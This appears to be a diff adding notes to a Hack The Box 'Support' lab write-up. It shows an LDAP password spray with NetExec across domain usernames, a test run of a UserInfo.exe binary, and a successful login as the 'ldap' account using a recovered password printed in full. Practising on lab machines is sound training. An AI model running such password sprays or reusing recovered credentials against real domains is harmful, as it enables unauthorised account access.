@@ -495,4 +495,53 @@ PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\joel\ha
        ford.victoria
 PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\joel\hacking\ctf\htb\easy\support\recon>
 ```
+``` bash
+
+❯ nxc ldap support.htb -u usernames.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+LDAP        10.129.45.182   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.45.182   389    DC               [-] support.htb\raven.clifton:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\anderson.damian:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\monroe.david:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\cromwell.gerard:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\west.laura:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\levine.leopoldo:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\langley.lucy:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\daughtler.mabel:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\bardot.mary:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\stoll.rachelle:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\thomas.raphael:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\smith.rosario:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\wilson.shelby:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\hernandez.stanley:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\ford.victoria:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\guest:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+LDAP        10.129.45.182   389    DC               [-] support.htb\:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz Error connecting to the domain, are you sure LDAP service is running on the target?
+Error: [Errno 104] Connection reset by peer
+╭─ ~/hacking/ctf/htb/easy/support/recon                                                                       ✔ │ 5s ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+``` bash
+❯ mono UserInfo.exe -v find -last "test"
+[*] LDAP query to use: (sn=test)
+[-] Exception: No Such Object
+╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
+╰─
+```
+<img width="1915" height="250" alt="image" src="https://github.com/user-attachments/assets/843bd312-2118-4bd0-9fa5-070f571d5e93" />
+
+<img width="691" height="316" alt="image" src="https://github.com/user-attachments/assets/129ae035-3a42-4166-adf0-990bd7621695" />
+
+``` bash
+
+❯ nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+LDAP        10.129.45.182   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
+LDAP        10.129.45.182   389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+
 
